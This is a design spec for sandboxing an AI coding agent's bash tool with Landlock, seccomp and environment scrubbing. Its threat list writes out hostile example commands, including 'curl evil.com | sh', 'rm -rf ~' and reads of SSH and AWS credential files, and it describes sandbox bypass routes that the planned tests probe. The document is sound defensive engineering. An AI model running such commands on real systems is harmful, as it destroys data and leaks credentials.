# Spec — bash tool OS sandbox (SR-3a)

Status: approved (brainstorm 2026-07-11)
Slice: second vertical slice for Pythia (Go + Bubble Tea, ports-and-adapters)
Supersedes the SR-3a placeholder named in `internal/adapter/tool/bash/bash.go`.

## Problem statement

The `bash` built-in tool runs arbitrary model-issued shell commands via
`exec.CommandContext("bash", "-c", cmd)` with **no OS-level isolation**. The
only bounds today are a working directory (`cmd.Dir`, not a jail), a context
timeout, a bounded output buffer, and env passthrough. A command can:

- read anything the process user can (`~/.ssh/id_rsa`, `~/.aws/credentials`);
- write/delete anywhere (`rm -rf ~`, overwrite `~/.bashrc`);
- make arbitrary network connections (`curl evil.com | sh`, exfiltrate a secret
  it just read);
- issue any syscall (`ptrace` another process, `mount`, load kernel modules);
- inherit every environment variable of the parent, including secrets.

Because the model chooses the command from untrusted context (a prompt, a tool
result, a file it read), this is a live remote-code-execution surface, not a
theoretical one. This slice closes it with OS-enforced isolation applied at the
existing `core.Tool` boundary.

## Outcomes

A command run through the `bash` tool executes under an OS sandbox that:

1. **Filesystem** — may read broadly but may **write only** inside the
   workspace root and `/tmp`. Writing anywhere else fails with `EACCES`.
2. **Network** — has **no** network access (outbound or inbound). `socket()`
   for `AF_INET`/`AF_INET6` fails, so exfiltration and remote-payload fetches
   are impossible.
3. **Syscalls** — runs under a seccomp-bpf allowlist; dangerous syscalls
   (`ptrace`, `mount`, `kexec_load`, `bpf`, `add_key`, `unshare`, `pivot_root`,
   swap, kernel-module, and clock/reboot families) are denied.
4. **Environment** — receives only an allowlisted, minimal environment
   (`PATH`, `HOME`, `TERM`, `LANG`); no inherited secrets reach the subprocess.

The sandbox is **fail-closed**: if it cannot be established, the command does
not run.

## Scope

### In scope

- Landlock filesystem policy (read-broad, write workspace + `/tmp`).
- seccomp-bpf policy: network denial (via `socket` domain filtering) **and** a
  dangerous-syscall denylist/allowlist, in one filter.
- Environment allowlist scrubbing.
- The self-re-exec application mechanism (below) and its `cmd/pythia`
  subcommand hook.
- Fail-closed behaviour + the `PYTHIA_BASH_SANDBOX=off` debug escape hatch.
- Build-tagged Linux implementation + a non-Linux stub that refuses.
- Integration + e2e tests proving each control.
- An ADR recording the mechanism decisions and the re-exec pattern.

### Out of scope (YAGNI)

- A read-denylist for `~/.ssh`, `~/.aws`, etc. — the network denial already
  breaks the read-then-exfiltrate chain, so broad read (Codex parity) is
  acceptable. Revisit only if a concrete threat needs it.
- Per-command dynamic policy / user-configurable allowlists. Policy is fixed at
  construction, matching the existing "nothing in args can widen the bound"
  invariant (SR-5).
- macOS/Windows sandbox backends (Seatbelt, etc.). Non-Linux builds refuse.
- Resource limits beyond the existing timeout/output cap (cgroups, rlimits,
  pids) — separate hardening slice if warranted.
- Mount/pid/user namespaces or a container/gVisor runtime — heavier than the
  Landlock+seccomp baseline this slice commits to (see ADR alternatives).

## Design

> **Threat pass applied.** The mechanisms below incorporate the 11 must-fix
> corrections from `docs/security/bash-sandbox-threat-model.md` — the naive
> "deny `AF_INET` + syscall denylist" design was proven bypassable
> (io_uring, `AF_UNIX`→host daemons, x32, inherited fds). Read that doc for the
> full bypass analysis; the corrected controls are load-bearing, not optional.

### Mechanisms (all pure-Go — `CGO_ENABLED=0` static binary preserved)

| Layer      | Mechanism                                   | Policy (corrected) |
|------------|---------------------------------------------|--------|
| Filesystem | Landlock (`github.com/landlock-lsm/go-landlock`), **strict min-ABI ≥ 2, fail-closed** | read broad; write only workspace root + `/tmp`. ABI ≥ 2 required so REFER-gated hardlink escapes are closed; refuse (fail-closed) on older kernels rather than degrade. |
| Network    | seccomp — deny `socket()` for **all address families** + block **io_uring** (`io_uring_setup`/`enter`) | no network. Denying only `AF_INET/6` is insufficient: `AF_UNIX` reaches host daemons (`docker.sock` = host takeover), `AF_NETLINK` leaks; io_uring submits `SOCKET`/`CONNECT` as ring ops that never hit the syscall layer. |
| Syscalls   | seccomp-bpf **allowlist (default-deny)** (`github.com/elastic/go-seccomp-bpf`), **arch-validated (block x32/foreign)**, **`NO_NEW_PRIVS` set** | allowlist, not denylist — only default-deny fails safe against multiplexers, `process_vm_readv/writev`, `userfaultfd`, `kcmp`, x32, and future syscalls. Lethal set (`ptrace`, `process_vm_*`, `mount`, `pivot_root`, `kexec`, module/key/`bpf`/io_uring/`userfaultfd`/`unshare`/reboot/swap, foreign-arch) → `KILL_PROCESS`. |
| Env        | allowlist scrub + **fixed `PATH` constant**, bash by **absolute path** | keep `HOME`/`TERM`/`LANG`; `PATH` is a fixed constant (never inherited — a prior command could plant a fake `bash`/`curl`); resolve/exec `/bin/bash` by absolute path. Allowlist correctly drops `LD_PRELOAD`/`BASH_ENV`/`ENV`/`IFS`. |

Both libraries are pure Go and operate via `x/sys/unix` syscalls, so the
static-binary constraint (ADR-0004-adjacent, first slice) holds. `libseccomp`
(CGO) is explicitly rejected.

**seccomp default action (settled):** per-syscall, not one-size — `ENOSYS` for
the unknown long tail (libc feature-probes degrade gracefully), `EACCES`/
`EAFNOSUPPORT` for sockets (so `curl` fails cleanly and the model stops
retrying), `KILL_PROCESS` for the lethal set above and any foreign-arch attempt
(loud, un-catchable, no SIGSYS retry loop).

### Application mechanism — self re-exec

Landlock rulesets and seccomp filters apply to the **calling** process/thread
and are inherited across `execve`. They must therefore be installed in the
child *before* it becomes `bash` — never in the parent, or Pythia itself would
be sandboxed. Go has no post-fork/pre-exec hook (the runtime cannot safely run
Go code between fork and exec), so the idiomatic pattern is **re-exec of self**:

```
pythia
  └─ exec.Command(/proc/self/exe, "__bash-sandbox")   // re-exec self by /proc/self/exe
       │  ← ALL parent fds close-on-exec (no Ollama socket / SQLite handle leaks in)
       │  ← command + policy delivered via length-prefixed pipe (never argv/env)
       └─ (child) set NO_NEW_PRIVS
          └─ apply env scrub (fixed PATH constant)
             └─ apply Landlock ruleset (strict ABI ≥ 2)
                └─ apply seccomp filter (allowlist, arch-validated, TSYNC)
                   └─ syscall.Exec("/bin/bash", ["bash","-c",cmd], scrubbedEnv)
                        // Landlock + seccomp persist across execve into bash
```

- The child is Pythia re-invoked **from `/proc/self/exe`** (not `os.Args[0]`,
  which a writable-scope binary swap could subvert) with a reserved first arg
  (`__bash-sandbox`). `cmd/pythia/main.go` detects this arg **before** loading
  config or starting the TUI, runs the sandbox-child entrypoint, never returns
  to the TUI path.
- **All inherited parent fds must be close-on-exec.** An inherited connected
  socket defeats network denial (`sendmsg` needs no `socket()`); an inherited
  writable fd defeats Landlock (access is checked at open time, not per-write).
- The command string and resolved policy (workspace root) are passed to the
  child **out-of-band via a length-prefixed pipe** — never argv (attacker
  controls command bytes; newline/NUL desync delimiter framing) and never a
  shell-visible env token.
- **The session DB and the binary must live outside the writable scope.** With
  defaults `./pythia.db` and often the binary sit *inside* the workspace; a
  command could tamper session history or overwrite the binary and break
  re-exec integrity. Relocate/deny both.
- stdout/stderr/exit-code/timeout/truncation semantics are unchanged — the
  parent still wires the bounded buffers and the context timeout onto the child
  `exec.Cmd`, so the existing `output` envelope is preserved.

### Boundary / architecture

- All sandbox logic lives inside `internal/adapter/tool/bash`. `internal/core`
  stays stdlib-only; the dependency-rule fitness test (`internal/arch`) still
  passes. The adapter gains dependencies on `x/sys/unix`, `go-landlock`, and
  `go-seccomp-bpf`.
- The only cross-cutting change is the reserved-subcommand hook in
  `cmd/pythia/main.go`. It stays a thin dispatch to a function exported by the
  bash adapter; no sandbox logic lives in `main`.
- Build tags split the implementation:
  - `sandbox_linux.go` — real Landlock + seccomp + env scrub + re-exec child.
  - `sandbox_other.go` — stub whose apply step returns a "sandbox unsupported on
    this platform" error, so a non-Linux build **refuses** (fail-closed) unless
    the escape hatch is set.

### Fail-closed behaviour

- Default: sandbox **ON**.
- If the kernel lacks Landlock (pre-5.13) or seccomp, or the platform is
  non-Linux, `Invoke` returns an **error envelope** ("bash sandbox unavailable")
  and does **not** run the command.
- Escape hatch: `PYTHIA_BASH_SANDBOX=off` (read via existing `internal/config`)
  runs the command **without** the sandbox — for debugging only. When set, the
  tool description / a one-time log makes the unsandboxed state explicit. This
  is the single, explicit way to opt out; nothing in the model's tool args can
  trigger it (SR-5 preserved).

## Testing

Linux-gated integration tests (build tag `integration`, matching the project's
test-tier convention) asserting, through the tool's `Invoke`:

- write outside workspace (`echo x > /etc/pythia-probe`) → denied (`EACCES`),
  non-zero exit in envelope;
- write inside workspace and `/tmp` → succeeds;
- read broadly (`cat /etc/hostname`) → succeeds (read is not restricted);
- network (`curl`/a raw `socket()` probe) → denied;
- `ptrace`/`mount` probe → denied;
- env secret not visible: parent sets `SECRET=...`, `echo $SECRET` in the
  sandbox → empty;
- `PYTHIA_BASH_SANDBOX=off` → the same probes now succeed (escape works);
- kernel-unsupported / non-Linux path → fail-closed error envelope (stubbable).

e2e: a sandboxed command exercised end-to-end through the tool registry. Unit
tests for the env-allowlist filter and the policy/config plumbing. The
`internal/arch` guard runs unchanged and must stay green (core still
stdlib-only).

Additional bypass-probe tests seeded by the threat model (each proves a
must-fix control): `AF_UNIX`/`AF_NETLINK` socket probe → denied; an io_uring
network/open attempt → denied (or KILL); an x32 / i386 syscall attempt → KILL;
inherited-fd probe (parent leaks a socket/writable fd) → not present in child;
hardlink-out-of-scope-then-write → denied (Landlock ABI ≥ 2); fake `bash`/`curl`
planted on a writable PATH dir → not used (fixed PATH, absolute exec); binary/DB
overwrite attempt → denied (outside writable scope).

## Residual risk (sandbox cannot close — must be documented)

The bash tool returns **stdout to the model/provider**. A command can
`cat ~/.ssh/id_rsa` and exfiltrate through the tool-output channel — network
denial does not touch this path. Acceptable **only because the provider (Ollama)
is local**; that assumption is load-bearing (SR-3a.H2 in the threat model). If a
remote provider is ever added, this reopens and needs a read-denylist or
output-scrubbing revisit.

## Settled (were open questions)

- **seccomp action** → per-syscall: `ENOSYS` for the unknown tail, `EACCES`/
  `EAFNOSUPPORT` for sockets, `KILL_PROCESS` for the lethal set + foreign-arch.
- **Landlock ABI** → strict minimum ≥ 2, fail-closed; no best-effort degrade.
- **allowlist vs denylist** → allowlist (default-deny), firm — the only design
  that fails safe against io_uring, multiplexers, `process_vm_*`, x32, and
  future syscalls.

Full rationale, STRIDE table, per-control bypass analysis, and the 14 must-fix
+ 3 hardening security requirements (SR-3a.1–.14, SR-3a.H1–H3) live in
`docs/security/bash-sandbox-threat-model.md` and seed the build plan.
